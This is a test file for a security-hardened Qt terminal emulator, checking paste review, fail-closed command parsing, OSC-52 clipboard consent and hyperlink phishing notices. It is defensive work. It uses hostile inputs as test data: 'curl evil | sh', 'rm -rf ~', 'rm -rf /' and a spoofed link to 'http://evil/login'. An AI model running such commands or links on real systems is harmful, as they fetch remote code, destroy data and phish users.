_pmnh = _QMimePaste()
_pmnh.setText('curl evil | sh\n')
_nh.insertFromMimeData(_pmnh)
ok(_nh._line_dirty,
   'a CLI paste marks the line unverifiable (guards _send_reexport)')
ok(_nh._line_pending(),
   '_line_pending() reports a held prompt after a paste, blocking re-export')

# Ctrl+M / Ctrl+J are accept-line (submit) like Enter: they reset the line state so a
# stale dirty flag does not poison the next prompt.
cw._line_buffer = 'curl x | sudo sh'
cw._line_dirty = True
_hsent.clear()
key(cw, Qt.Key.Key_M, mods=_ctrl_mod)                # Ctrl+M == CR == accept-line
ok(not cw._line_dirty and cw._line_buffer == '' and b'\r' in _hsent,
   'Ctrl+M submits and resets the line state')
cw._line_buffer = 'ls'
cw._line_dirty = False
_hsent.clear()
key(cw, Qt.Key.Key_J, mods=_ctrl_mod)                # Ctrl+J == LF == accept-line
ok(not cw._line_dirty and cw._line_buffer == '' and b'\n' in _hsent,
   'Ctrl+J submits, resets the line, leaves no stale dirty flag')

# paste_warn='never' must NOT bypass the multi-command gate: a MULTI-line paste (a hidden
# second command that would auto-run) is still held for review. A single-line paste is
# delivered with its submit stripped, so it cannot auto-run either.
_hsent.clear()
cw.apply_paste_warn('never')
cw._line_dirty = False
_pmnever = _QMimePaste()
_pmnever.setText('echo a\nrm -rf ~\n')                # embedded newline -> multi-command
cw.insertFromMimeData(_pmnever)
ok(cw.review_pending(),
   "paste_warn='never' still holds a MULTI-line paste (hidden second command)")
cw.dispatch_pending_paste('reject')
eq(_hsent, [], 'the rejected multi-line paste sends nothing to the shell')
# a single-line paste under 'never' is NOT held -- delivered without its submit.
cw._line_dirty = False
_pmnever1 = _QMimePaste()
_pmnever1.setText('rm -rf ~\n')
cw.insertFromMimeData(_pmnever1)
ok(not cw.review_pending(), "paste_warn='never': a single-line paste is not held")
eq(_hsent, [b'rm -rf ~'],
   "even under 'never' a single-line paste reaches the shell WITHOUT its submit")

# HELD multi-line paste (GUARANTEED delivery): a reviewed non-bracketed multi-line
# paste delivers ONLY line 1; the rest are HELD and inserted one at a time by an
# EXPLICIT paste gesture, and only while no foreground program owns the tty -- so
# nothing auto-runs AND a held line can reach only the reviewed shell. Enter never
# advances the held paste.
cw.apply_paste_warn('unicode')
cw._line_buffer = ''
cw._line_dirty = False
cw._staged_paste = []
_hsent.clear()
_pmstage = _QMimePaste()
_pmstage.setText('echo one\ncurl evil | sh\n')       # two commands, non-bracketed
cw.insertFromMimeData(_pmstage)
ok(cw.review_pending(), 'the multi-line paste is held for review')
cw.dispatch_pending_paste('stripped')                # user picks Paste (ASCII)
eq(_hsent, [b'echo one'],
   'delivers ONLY line 1 -- the embedded second command never reaches the shell '
   '(nothing auto-runs)')
eq(cw._staged_paste, ['curl evil | sh'], 'the rest is HELD, not written')
ok(cw._line_dirty, 'the delivered first line marks the prompt unverifiable')

# CANARY (reviewdrain16 #2): Enter -- and a following read -- must NEVER advance a held
# paste (the earlier deferred-feed design armed on Enter and fed on the next read).
_hsent.clear()
key(cw, Qt.Key.Key_Return)
eq(_hsent, [b'\r'], 'Enter submits line 1 and writes no held line')
feed_output(cw, b'$ ')                               # a read after Enter must not feed either
eq(_hsent, [b'\r'], 'a read after Enter does not feed a held line')
eq(cw._staged_paste, ['curl evil | sh'], 'the held line survives Enter + a read, untouched')

# the user inserts the next line with an EXPLICIT paste gesture; at an idle prompt (no
# fg program) it goes to the reviewed shell, still un-submitted (no CR). The clipboard
# is ignored while a remainder is held.
_dummy = _QMimePaste()
_dummy.setText('CLIPBOARD IGNORED WHILE HELD')
_hsent.clear()
cw.insertFromMimeData(_dummy)                        # paste gesture advances the held paste
eq(_hsent, [b'curl evil | sh'],
   'a paste gesture at an idle prompt inserts the next held line (no CR, awaits Enter)')
eq(cw._staged_paste, [], 'the held remainder drains as each line is inserted')
# once drained, a paste gesture is an ordinary clipboard paste again.
cw._line_dirty = False
_hsent.clear()
_pmnew = _QMimePaste()
_pmnew.setText('plain')
cw.insertFromMimeData(_pmnew)
eq(_hsent, [b'plain'], 'with nothing held, Paste is an ordinary clipboard paste')
cw._staged_paste = []
cw._line_dirty = False

# SECURITY GUARANTEE (reviewdrain16 #1): a paste gesture inserts a held line ONLY at the
# reviewed shell. If a foreground program owns the tty (line 1 was sudo -i / ssh / a
# pager), the gesture is REFUSED and the remainder dropped, so a line reviewed for the
# shell can NEVER reach that program. Reliable because the gesture is a deliberate
# keypress at an idle prompt: fg==False then provably == the reviewed shell (any launched
# program reads fg==True). CANARY: the deferred-feed design wrote the line on a read that
# raced the fork; this checks fg at the gesture instead.
_redir = SecureTerminal(command='/bin/cat')
_rsent = spy_writes(_redir)
_redir._staged_paste = ['rm -rf /']                  # the dangerous held line
_redir.has_foreground_program = lambda: True         # line 1 (sudo -i) owns the tty now
_rdummy = _QMimePaste()
_rdummy.setText('x')
_redir.insertFromMimeData(_rdummy)                   # explicit paste gesture
eq(_rsent, [], 'a held line is NEVER inserted while a foreground program owns the tty')
eq(_redir._staged_paste, [], 'the held remainder is dropped -- the reviewed context is gone')
_redir.close()

# a TUI/foreground context also refuses (the gate is tui_active OR has_foreground_program).
_redir2 = SecureTerminal(command='/bin/cat', tui=True)
_r2sent = spy_writes(_redir2)
_redir2._staged_paste = ['reboot']
_r2dummy = _QMimePaste()
_r2dummy.setText('x')
_redir2.insertFromMimeData(_r2dummy)
eq(_r2sent, [], 'a TUI context also refuses to insert a held line')
eq(_redir2._staged_paste, [], 'and drops the remainder')
_redir2.close()

# Ctrl+C (SIGINT) ABANDONS a held paste.
cw._staged_paste = ['rm -rf ~', 'reboot']
_hsent.clear()
key(cw, Qt.Key.Key_C, mods=_ctrl_mod)
eq(cw._staged_paste, [], 'Ctrl+C abandons the held-paste remainder')

# #38: TUI-mode Ctrl+C must ABANDON a held paste, exactly as the CLI path does -- else a
# stale staged line leaks into a later paste gesture. (canary: the old _tui_key discard
# branch cleared _line_buffer/_line_dirty but left _staged_paste intact.)
_tc = SecureTerminal(command='/bin/cat', tui=True)
_tcsent = spy_writes(_tc)
_tc.has_foreground_program = lambda: False
_tc._staged_paste = ['rm -rf ~', 'reboot']
_tc._tui_key(QKeyEvent(QEvent.Type.KeyPress, Qt.Key.Key_C,
                       Qt.KeyboardModifier.ControlModifier, ''))
eq(_tc._staged_paste, [], '#38: TUI Ctrl+C abandons the held-paste remainder (CLI parity)')
ok(_tcsent and _tcsent[-1] == b'\x03', '#38: TUI Ctrl+C still sends the interrupt byte')
# Ctrl+U (cursor-dependent kill) must NOT abandon the stage -- only Ctrl+C does.
_tc._staged_paste = ['keepme']
_tc._tui_key(QKeyEvent(QEvent.Type.KeyPress, Qt.Key.Key_U,
                       Qt.KeyboardModifier.ControlModifier, ''))
eq(_tc._staged_paste, ['keepme'], '#38: TUI Ctrl+U does NOT abandon the held paste')
_tc.close()

# #39: a foreground program EXITING back to the shell must also DROP a held paste -- a
# non-bracketed TUI child force-reviews a multiline paste and stages the remainder as ITS
# input; once it exits, a paste gesture at the returning shell prompt would insert those
# program-reviewed lines as shell commands. (canary: the old read path cleared the stage
# only on the fg False->True edge, never on True->False.)
_ex39 = SecureTerminal(command='/bin/cat')
_ex39.has_foreground_program = lambda: False     # the program has now exited (back to shell)
_ex39._bracket_had_fg = True                     # ...it WAS in the foreground on the last read
_ex39._staged_paste = ['leaked-into-shell']
feed_output(_ex39, b'$ ')                        # a read observes the fg True->False edge
eq(_ex39._staged_paste, [], '#39: a foreground program exiting drops the held paste remainder')
_ex39.close()

# #19: a blank line inside a multi-line paste is a LEGITIMATE empty command -- each staged
# line waits for the user's OWN Enter, so a blank staged line writes nothing and the user's
# Enter submits an empty command. (canary: the old `if ln` filter DROPPED empty staged
# lines, silently losing the blank line's Enter and shifting later commands up.)
cw.apply_paste_warn('unicode')
cw._line_buffer = ''
cw._line_dirty = False
cw._staged_paste = []
_hsent.clear()
_pmblank = _QMimePaste()
_pmblank.setText('echo a\n\necho b')             # a, a BLANK line, then b (Unix newlines)
cw.insertFromMimeData(_pmblank)
ok(cw.review_pending(), '#19: the multi-line paste with a blank line is held for review')
cw.dispatch_pending_paste('stripped')
eq(_hsent, [b'echo a'], '#19: delivers line 1 only')
eq(cw._staged_paste, ['', 'echo b'],
   '#19: the BLANK line is PRESERVED as an empty staged command (not dropped)')
cw._staged_paste = []
cw._line_dirty = False
# REGRESSION GUARD: preserving blanks must NOT reintroduce the Windows-CRLF spurious empty
# (a \r\n -> two submit CRs). The CRLF collapse keeps a real Unix blank distinct from a
# CRLF pair, so a CRLF paste still stages no empty element between the commands.
_hsent.clear()
_pmcrlf2 = _QMimePaste()
_pmcrlf2.setText('echo 1\r\necho 2')
cw.insertFromMimeData(_pmcrlf2)
cw.dispatch_pending_paste('stripped')
eq(cw._staged_paste, ['echo 2'],
   '#19: CRLF still collapses to one break -- preserving blanks added no spurious empty')
cw._staged_paste = []
cw._line_dirty = False

# an empty held line (a blank line in the paste) writes nothing but is consumed by the
# gesture, so the next gesture advances to the following command.
cw._staged_paste = ['', 'echo done']
cw._line_dirty = False
_hsent.clear()
_edummy = _QMimePaste()
_edummy.setText('x')
cw.insertFromMimeData(_edummy)
eq(_hsent, [], 'inserting an empty held line writes no bytes')
eq(cw._staged_paste, ['echo done'], 'but the blank line is consumed, next line pending')
cw._staged_paste = []
cw._line_dirty = False

# a foreground program taking the tty DROPS a CLI-staged paste: the stage belonged to
# the shell prompt it was pasted at, not to the program. Exiting the program and
# pressing Enter must not feed a stale line to the returning prompt.
_stg = SecureTerminal(command='/bin/cat')
_stg.has_foreground_program = lambda: True            # a program owns the tty
_stg._bracket_had_fg = False                          # ...on the False->True edge
_stg._staged_paste = ['stale line']
feed_output(_stg, b'program output')                  # a read observes the fg edge
eq(_stg._staged_paste, [], 'a foreground program starting drops a CLI-staged paste')
_stg.close()

# CRLF is ONE line break: a Windows-clipboard multi-line paste must NOT stage a
# spurious empty line between the two commands. sanitize_paste maps every newline to
# a submit CR; without collapsing CRLF first, "\r\n" became "\r\r" -> an empty staged
# element the user had to Enter past.
cw.apply_paste_warn('unicode')
cw._line_buffer = ''
cw._line_dirty = False
cw._staged_paste = []
_hsent.clear()
_pmcrlf = _QMimePaste()
_pmcrlf.setText('echo 1\r\necho 2')                  # CRLF between the two commands
cw.insertFromMimeData(_pmcrlf)
ok(cw.review_pending(), 'the CRLF multi-line paste is held for review')
cw.dispatch_pending_paste('stripped')
eq(_hsent, [b'echo 1'], 'a CRLF paste delivers the first line, no spurious empty line')
eq(cw._staged_paste, ['echo 2'],
   'CRLF collapses to one break -- no empty staged element between the commands')
cw._staged_paste = []
cw._line_dirty = False

# _argv_for_command distinguishes THREE cases so a broken command never becomes a
# login shell: a MALFORMED string (unbalanced quote) yields None (FAIL CLOSED -- the
# child exits 127, never a shell), an EMPTY command yields [] (the deliberate 'no
# command -> shell'), a list is verbatim. It does not RAISE (a ValueError in the
# pty.fork child would traceback and be masked as a normal exit).
from secure_terminal.terminal import _argv_for_command as _argv   # noqa: E402
eq(_argv(['ssh', '-p', '22', 'host']), ['ssh', '-p', '22', 'host'],
   'a list command is used verbatim as argv')
eq(_argv('ssh -p 22 host'), ['ssh', '-p', '22', 'host'],
   'a string command is split like a shell word list')
eq(_argv(''), [], 'an empty command yields [] (caller substitutes the login shell)')
eq(_argv(None), [], 'no command yields []')
ok(_argv('echo "unbalanced') is None,
   'a MALFORMED command yields None (fail closed, no shell) -- distinct from [] (empty)')
# agy: a WHITESPACE-only command shell-splits to [] without raising -- it names no
# program, so it must fail closed (None), not fall through to a login shell.
ok(_argv('   ') is None, 'a whitespace-only command yields None (fail closed)')
ok(_argv(' \t ') is None, 'tabs+spaces (no words) yields None (fail closed)')
# codex: an EMPTY program name (`-e '""'` -> ['']) also names no program -- fail closed.
ok(_argv('""') is None, 'an empty quoted program name yields None (fail closed)')
ok(_argv('"" arg') is None, 'a leading empty program name yields None (fail closed)')
# codex: a malformed command must not restart_as_shell on the child's 127 exit (the
# IPC/GUI path where the CLI parse never runs) -- the tab is marked _command_malformed
# in the parent so restart_as_shell REFUSES; the caller then CLOSES the tab, never a
# login shell. (canary: old code left _command_malformed False and restarted a shell.)
_mfc = SecureTerminal(command="printf 'unbalanced")
ok(_mfc._command_malformed,
   'a malformed-command tab is marked _command_malformed in the parent')
ok(_mfc.restart_as_shell() is False,
   'restart_as_shell refuses a malformed-command tab (fail closed: the tab closes)')
_mfc.close()

# #27: a WELL-FORMED -e command whose program cannot exec (missing / non-executable
# binary) must ALSO fail closed -- exit status 127 alone cannot distinguish it from a
# real program that ran and exited 127, so _start uses a close-on-exec handshake pipe.
# A failed execvp writes a byte -> _command_exec_failed True -> restart_as_shell REFUSES
# -> the caller closes the tab (never a silent login shell for a locked-down launch).
# (canary: pre-#27 code has no _command_exec_failed and restart_as_shell returns True,
# dropping to a shell -- the exact gap #27 closes.)
_ef = SecureTerminal(command='/nonexistent/secure-terminal-xyzzy')
ok(_ef._command_malformed is False,
   'an exec-failing command is well-formed (not _command_malformed)')
ok(_ef._command_exec_failed is True,
   'a missing -e program is marked _command_exec_failed via the exec-detection pipe')
ok(_ef.restart_as_shell() is False,
   'restart_as_shell refuses an exec-failed tab (fail closed: the tab closes, no shell)')
_ef.close()
# positive control: a program that ACTUALLY execs (even one that then exits nonzero) is
# NOT exec-failed -- the pipe closes on the successful exec, so the tab still restarts.
_erx = SecureTerminal(command='/bin/cat')
ok(_erx._command_exec_failed is False,
   'a real program that execs leaves _command_exec_failed False (restart still allowed)')
_erx.close()

# #44: a LIST command whose FIRST element is empty ('' from `-- ""`) names no program, so
# it must fail closed exactly like the string path -- else _argv_for_command's list path
# returns [''] and the child drops to a login shell. (canary: the old list path returned
# [''] with _command_malformed False -> a shell.)
_lfc = SecureTerminal(command=[''])
ok(_lfc._command_malformed,
   '#44: a list command with an empty first element is _command_malformed (fail closed)')
ok(_lfc.restart_as_shell() is False,
   '#44: restart_as_shell refuses an empty-list-command tab (no drop to a shell)')
_lfc.close()
_elc = SecureTerminal(command=[])             # empty list = the deliberate no-command case
ok(_elc._command_malformed is False,
   '#44: an empty list is the no-command case (login shell), not fail-closed')
_elc.close()
from secure_terminal.terminal import _argv_for_command as _afc44   # noqa: E402
ok(_afc44(['']) is None, '#44: _argv_for_command([""]) is None (fail closed)')
ok(_afc44(['  ']) is None, '#44: _argv_for_command(["  "]) is None (whitespace first elem)')
eq(_afc44([]), [], '#44: _argv_for_command([]) is [] (no command -> shell)')
# A (ai-review): an embedded NUL can never be a valid program/arg (os.execvp raises
# ValueError, which the child's OSError-only handler let escape -> fail-OPEN to a shell).
# Reject pre-fork, fail closed, in both the list and string forms.
ok(_afc44(['bad\x00program']) is None,
   'A: a list element with an embedded NUL fails closed (None)')
ok(_afc44(['ok', 'arg\x00two']) is None,
   'A: a NUL in a LATER list element fails closed too')
ok(_argv('bad\x00cmd') is None,
   'A: a string command with an embedded NUL fails closed (None)')
eq(_afc44(['ls', '-l']), ['ls', '-l'], '#44: a real list command is verbatim')

# #45: a PENDING OSC-52 clipboard-read consent must NOT survive restart_as_shell -- else
# clicking Allow replies the system clipboard into the NEW unrelated shell. restart resets
# _clipboard_read AND the allow-always grant (the new shell must re-consent). (canary: old
# restart left _clipboard_read 'pending', so a later grant wrote OSC-52 into the new shell.)
_cr45 = SecureTerminal(command='/bin/cat')     # a -- PROGRAM tab: restart drops to a shell
_cr45._clipboard_read = 'pending'
_cr45._clipboard_read_always = True
ok(_cr45.restart_as_shell() is True, '#45: a -- PROGRAM tab restarts to a login shell')
ok(_cr45._clipboard_read is None,
   '#45: restart_as_shell drops a pending OSC-52 clipboard-read consent')
ok(_cr45._clipboard_read_always is False,
   '#45: restart_as_shell forgets the allow-always grant (the new shell re-consents)')
_cr45.close()

_hsent.clear()
cw.apply_paste_warn('unicode')


# OSC-52 reply truncation: a slow/gone child can leave the ~87 KiB reply truncated, its
# buffered prefix then lacking the OSC terminator -- a dangling escape that swallows the
# next pty reader's output. A truncated write (_write returns False) is best-effort
# re-terminated; a full write appends no spurious terminator.
_clp = SecureTerminal(command='/bin/cat')
QGuiApplication.clipboard().setText('S3CRET' * 200)
_clpw = []
def _trunc_write(_data):
    _clpw.append(bytes(_data))
    return len(_clpw) != 1            # the reply (first call) truncates; the rest write
_clp._write = _trunc_write
_clp._last_clip_read = 0              # bypass the 1s rate limit
_clp._reply_clipboard()
ok(len(_clpw) == 2 and _clpw[0].startswith(b'\x1b]52;c;') and _clpw[1] == b'\x07',
   'a truncated OSC-52 reply is best-effort re-terminated (no dangling escape)')
_clpw2 = []
def _full_write(_d):
    _clpw2.append(bytes(_d))
    return True
_clp._write = _full_write   # a full write
_clp._last_clip_read = 0
_clp._reply_clipboard()
ok(len(_clpw2) == 1, 'a fully-written OSC-52 reply appends no extra terminator')
_clp.close()
## A2: Clear realistic secrets left on the OS clipboard
QGuiApplication.clipboard().clear()

# SEC-1: OSC-52 clipboard-read consent is a TOCTOU. osc_clipboard_read can be disabled
# WHILE the consent dialog is open; a later Allow must NOT answer the stale READ query.
_ctc = SecureTerminal(command='/bin/cat')
_ctc.apply_osc('osc_clipboard_read', True)
QGuiApplication.clipboard().setText('S3CRET')
_ctcw = []
def _ctc_write(_d):
    _ctcw.append(bytes(_d))
    return True
_ctc._write = _ctc_write
_ctc._last_clip_read = 0
_ctc._clipboard_read = 'pending'                       # a consent dialog is open
_ctc.apply_osc('osc_clipboard_read', False)            # feature disabled while it is open
ok(_ctc._clipboard_read is None,
   'SEC-1: disabling osc_clipboard_read drops the in-flight pending consent')
_ctc.grant_clipboard_read(_ctc.CLIP_ALLOW_ALWAYS)      # user clicks Allow on the stale dialog
ok(not any(b'\x1b]52;c;' in _w for _w in _ctcw),
   'SEC-1: a grant after the feature was disabled writes NO OSC-52 reply (no clipboard exfil)')
# guard-only path: force pending with the feature already off, grant re-checks the flag
_ctc._osc['osc_clipboard_read'] = False
_ctc._clipboard_read = 'pending'
_ctc._last_clip_read = 0                                # else the 1s rate-limit masks a reply
_ctcw.clear()
_ctc.grant_clipboard_read(_ctc.CLIP_ALLOW_ONCE)
ok(not any(b'\x1b]52;c;' in _w for _w in _ctcw),
   'SEC-1: grant_clipboard_read re-checks the feature flag and withholds the reply when off')
## A2: Clear realistic secrets left on the OS clipboard
QGuiApplication.clipboard().clear()
_ctc.close()

# #30: an OSC 8 hyperlink split across two PTY reads (opener+text in one, closer in the
# next) must STILL fire the anti-phishing notice. (canary: the BEL-terminated opener was
# not carried, so _OSC8 never saw the pair and the notice was silently evaded.)
_h30 = SecureTerminal(command='/bin/cat', tui=True)
_h30.apply_osc('osc_hyperlink', True)
_h30_notes: list[str] = []
_h30.notified.connect(_h30_notes.append)
feed_output(_h30, b'\x1b]8;;http://evil/login\x07Login')   # opener + text (one read)
feed_output(_h30, b'\x1b]8;;\x07')                          # closer (next read)
ok(any('http://evil/login' in _n for _n in _h30_notes),
   '#30: a split OSC-8 hyperlink still fires the phishing notice')
_h30.close()

# #31: the visible label passes only sanitize_title (printable ASCII), so it can embed a
# fake ' -> uri'. The notice must present exactly ONE arrow -- the real target -- so a
# spoofed pair in the label cannot masquerade as the destination.
_h31 = SecureTerminal(command='/bin/cat', tui=True)
_h31.apply_osc('osc_hyperlink', True)
_h31_notes: list[str] = []
_h31.notified.connect(_h31_notes.append)
feed_output(_h31,
            b'\x1b]8;;http://evil\x07good.example -> https://trusted.example\x1b]8;;\x07')
eq(len(_h31_notes), 1, '#31: one hyperlink notice emitted')
eq(_h31_notes[0].count(' -> '), 1,
   '#31: exactly one arrow -- the label cannot spoof a second target pair')
ok(_h31_notes[0].endswith('http://evil'), '#31: the real target is the sole arrow target')
_h31.close()

# #3 (ai-review): the label arrow-strip must catch an arrow with NO surrounding spaces
# (realsite->evil), not only the spaced ' -> ' form -- else a fake arrow survives in the
# visible label and the notice shows two arrows.
_h3 = SecureTerminal(command='/bin/cat', tui=True)
_h3.apply_osc('osc_hyperlink', True)
_h3_notes: list[str] = []
_h3.notified.connect(_h3_notes.append)
feed_output(_h3,
            b'\x1b]8;;http://evil\x07trusted.example->safe.example\x1b]8;;\x07')
eq(len(_h3_notes), 1, '#3: one hyperlink notice emitted')
eq(_h3_notes[0].count('->'), 1,
   '#3: a no-space arrow in the label is stripped -- only the real separator arrow remains')
ok(_h3_notes[0].endswith('http://evil'), '#3: the real target is the sole arrow target')
_h3.close()

# #21 (property guard, not a fix -- the concern does not reproduce): an OSC payload grown
# past _OSC_CARRY_MAX is DROPPED (carry reset, no stale side-effect), and a display-mode
# toggle mid-OSC does not resurrect it. _osc_carry feeds only sanitized side-effects, never
# the renderer, so this is correct-by-design; the guard locks the bound. _handle_osc is
# driven directly -- feed_output cannot push > 64 KiB through the os.pipe in one write.
_h21 = SecureTerminal(command='/bin/cat', tui=True)
_h21.apply_osc('osc_title', True)
_h21_titles: list[str] = []
_h21.title_changed.connect(_h21_titles.append)
_h21._handle_osc(b'\x1b]0;' + b'A' * 5000)             # sub-cap unterminated OSC: held
ok(len(_h21._osc_carry) > 0, '#21: a sub-cap unterminated OSC is held')
_h21.apply_mode('show')                                # display-mode toggle mid-OSC
_h21._handle_osc(b'B' * (_h21._OSC_CARRY_MAX + 1))     # grow the held carry past the cap
eq(len(_h21._osc_carry), 0, '#21: an over-cap OSC carry is dropped, not retained')
_h21._handle_osc(b'C' * 10 + b'\x07')                  # terminate the dropped sequence
eq(_h21_titles, [], '#21: the dropped over-cap OSC fires no title (no stale side-effect)')
_h21.close()

# #22 (property guard, not a fix -- the scan is O(n), capped at _ALT_TRANSITIONS_MAX, not
# O(n^2)): _feed_stream detects alt-screen enter/leave at the right byte boundaries.
_h22 = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_h22, b'primary-line\n')
feed_output(_h22, b'\x1b[?1049hALT-FRAME')             # enter alt: snapshot primary
ok('ALT-FRAME' in _h22.toPlainText(), '#22: the alt frame shows after enter')
feed_output(_h22, b'\x1b[?1049l')                       # leave alt: restore primary
_txt22 = _h22.toPlainText()
ok('primary-line' in _txt22 and 'ALT-FRAME' not in _txt22,
   '#22: primary restored and the alt frame gone after leave')
_h22.close()

# SEC-1 (stale dialog): a consent dialog whose request was ABANDONED (osc_clipboard_read
# disabled) must NOT grant the tab after a re-enable -- a disable+re-enable+stale-allow-always
# would else grant allow-always and the next read would reply with no fresh prompt.
_cts = SecureTerminal(command='/bin/cat')
_cts.apply_osc('osc_clipboard_read', True)
_cts._clipboard_read = 'pending'                       # a consent dialog is open
_cts.apply_osc('osc_clipboard_read', False)            # abandon it (pending -> None)
_cts.apply_osc('osc_clipboard_read', True)             # re-enable
_cts.grant_clipboard_read(_cts.CLIP_ALLOW_ALWAYS)      # stale Allow-Always click
ok(_cts._clipboard_read is None,
   'SEC-1: a stale allow-always (dialog abandoned by a disable) does NOT grant the tab')
_ctsw = []
def _cts_write(_d):
    _ctsw.append(bytes(_d))
    return True
_cts._write = _cts_write
_cts._last_clip_read = 0
_cts._osc_clipboard_read()                             # the next OSC-52 read query
ok(_cts._clipboard_read == 'pending' and not any(b'\x1b]52;c;' in _w for _w in _ctsw),
   'SEC-1: after a stale grant the next read RE-ASKS (pending), it does not auto-reply')
_cts.close()

# #4: the OSC-52 attempt NOTICE (osc_used, CLI mode) must label a clipboard READ query
# (trailing '?') distinctly from a WRITE (base64 data), matching the actual dispatch --
# read (exfiltration) and write (injection) are different threats and gate differently.
# The notice re-derives read/write from a per-chunk window, so verify it agrees with the
# dispatch's endswith('?') for the payload shapes that could fool it: a large write whose
# base64 exceeds the notice window, and a query split across two reads (carry-rejoined).
import base64 as _b64_osc                                     # noqa: E402
def _osc52_notice(*chunks):
    _o = SecureTerminal(command='/bin/cat')
    _seen = []
    _o.osc_used.connect(lambda k: _seen.append(k))
    for _c in chunks:
        feed_output(_o, _c)
    _o.close()
    return _seen
ok(_osc52_notice(b'\x1b]52;c;?\x07') == ['osc_clipboard_read'],
   '#4: OSC 52 read query (?) is noticed as clipboard READ')
ok(_osc52_notice(b'\x1b]52;c;' + _b64_osc.b64encode(b'hi') + b'\x07') == ['osc_clipboard'],
   '#4: OSC 52 base64 payload is noticed as clipboard WRITE')
ok(_osc52_notice(b'\x1b]52;c;' + _b64_osc.b64encode(b'x' * 600) + b'\x07') == ['osc_clipboard'],
   '#4: a large OSC 52 write (base64 past the notice window) is still WRITE, not misread')
ok(_osc52_notice(b'\x1b]52;c;', b'?\x07') == ['osc_clipboard_read'],
   '#4: a read query split across two reads is carry-rejoined and still noticed as READ')

# F5: reap_pty_children WNOHANG-reaps ONLY our registered pty children, so the app can
# drop the blanket SIGCHLD=SIG_IGN that made every subprocess returncode read 0. Pin
# SIGCHLD to its default here so reaping is deterministic (an ambient SIG_IGN would let
# the kernel auto-reap our probe children before we waitpid them).
import time as _t5                                            # noqa: E402
_f5_prev_chld = signal.getsignal(signal.SIGCHLD)
signal.signal(signal.SIGCHLD, signal.SIG_DFL)
try:
    _dead = os.posix_spawn('/bin/true', ['/bin/true'], os.environ)   # exits -> zombie
    _t5.sleep(0.2)
    SecureTerminal._LIVE_PTY_PIDS.add(_dead)
    SecureTerminal.reap_pty_children()
    ok(_dead not in SecureTerminal._LIVE_PTY_PIDS,
       'reap_pty_children reaps and drops an exited pty child')
    _alive = os.posix_spawn('/bin/sleep', ['/bin/sleep', '30'], os.environ)
    SecureTerminal._LIVE_PTY_PIDS.add(_alive)
    SecureTerminal.reap_pty_children()
    ok(_alive in SecureTerminal._LIVE_PTY_PIDS,
       'reap_pty_children keeps a still-running pty child registered')
    os.kill(_alive, signal.SIGKILL)
    os.waitpid(_alive, 0)
    SecureTerminal._LIVE_PTY_PIDS.discard(_alive)
    _gone_pid = 2147480000                                   # a pid that is not our child
    SecureTerminal._LIVE_PTY_PIDS.add(_gone_pid)
    SecureTerminal.reap_pty_children()
    ok(_gone_pid not in SecureTerminal._LIVE_PTY_PIDS,
       'reap_pty_children drops a pid that is not (or no longer) our child')
    # a spawned tab registers its pty pid; shutdown() reaps a dead child (reaped branch)
    _rt = SecureTerminal(command='/bin/cat')
    _rt_pid = _rt._pid
    ok(_rt_pid in SecureTerminal._LIVE_PTY_PIDS,
       'a spawned tab registers its pty child for reaping')
    os.kill(_rt_pid, signal.SIGKILL)
    _t5.sleep(0.2)                                           # let it die -> a zombie
    _rt.shutdown()
    ok(_rt_pid not in SecureTerminal._LIVE_PTY_PIDS,
       'shutdown() reaps and unregisters an exited pty child')
    # shutdown() tolerates a child already reaped elsewhere (the ECHILD branch)
    _rt2 = SecureTerminal(command='/bin/cat')
    _rt2_pid = _rt2._pid
    os.kill(_rt2_pid, signal.SIGKILL)
    os.waitpid(_rt2_pid, 0)                                  # reap it out from under shutdown()
    _rt2.shutdown()
    ok(_rt2_pid not in SecureTerminal._LIVE_PTY_PIDS,
       'shutdown() tolerates a pty child already reaped elsewhere')
    # shutdown() while the child is still alive: WNOHANG reaps nothing (0, 0), so the pid
    # stays registered for the app's SIGCHLD handler (the not-yet-dead branch)
    _rt3 = SecureTerminal(command='/bin/cat')
    _rt3_pid = _rt3._pid
    _orig_waitpid = os.waitpid
    os.waitpid = lambda _p, _f: (0, 0)                      # pretend the child is still alive
    try:
        _rt3.shutdown()
    finally:
        os.waitpid = _orig_waitpid
    ok(_rt3_pid in SecureTerminal._LIVE_PTY_PIDS,
       'shutdown() leaves a still-running pty child registered for the handler')
    os.kill(_rt3_pid, signal.SIGKILL)                       # clean up the real (still-live) child
    os.waitpid(_rt3_pid, 0)
    SecureTerminal._LIVE_PTY_PIDS.discard(_rt3_pid)
finally:
    signal.signal(signal.SIGCHLD, _f5_prev_chld)

# a second paste arriving while a review is already open is ignored, not allowed to
# clobber the pending one (input is otherwise suspended during a review).
_rev = SecureTerminal(command='/bin/cat')
_rev.apply_paste_warn('always')
_pmrev1 = _QMimePaste()
_pmrev1.setText('first-paste')
_rev.insertFromMimeData(_pmrev1)
ok(_rev.review_pending(), 'first paste opens a review')
_pmrev2 = _QMimePaste()
_pmrev2.setText('second-paste')
_rev.insertFromMimeData(_pmrev2)                     # arrives during the open review
ok(_rev.review_pending() and _rev._pending_paste == 'first-paste',
   'a second paste during an open review is ignored (pending paste unchanged)')
_rev.dispatch_pending_paste('reject')

# --- colours: SGR run formatting + contrast guard -----------------------------




col = SecureTerminal(command='/bin/cat')
col.apply_colors(True)
col.apply_theme('dark')
col._append('\x1b[31mR\x1b[0m')          # red R via SGR, through the cell model
eq(fmt_of_char(col, 'R').foreground().color().name(), '#cd0000', 'red run fg')
col2 = SecureTerminal(command='/bin/cat')
col2.apply_colors(True)
col2.apply_theme('dark')
col2._append('\x1b[30mH\x1b[0m')         # black-on-dark must be contrast-guarded
ok(fmt_of_char(col2, 'H').foreground().color().name() != '#000000',
   'black-on-dark guarded')

# --- leftover colour must not bleed into the shell's next prompt --------------
# A program (here a hostile log) sets a background colour and exits WITHOUT
# resetting it. A normal terminal leaves that colour "stuck", so the shell's next
# prompt inherits it. secure-terminal resets the leftover at the prompt boundary
# (the bracketed-paste marker every shell line editor emits before a prompt), so
# the prompt renders on the default background -- while the program's OWN coloured
# output is untouched (shown, contrast-guarded, not stripped). This is the FULL
# _on_readable path (feed_output), where the reset injection lives; earlier tests
# only fed one-shot streams with no following prompt, so this case was uncovered.
lo = SecureTerminal(command='/bin/cat')
lo.apply_colors(True)
lo.apply_theme('dark')
feed_output(lo, b'\x1b[31;41mALERT\n\x1b[?2004hPS> ')
_alert_bg = fmt_of_char(lo, 'A').background()
ok(_alert_bg.style() != Qt.BrushStyle.NoBrush,
   'leftover colour: the program\'s own background colour is preserved (shown)')
_prompt_bg = fmt_of_char(lo, 'P').background()
ok(_prompt_bg.style() == Qt.BrushStyle.NoBrush
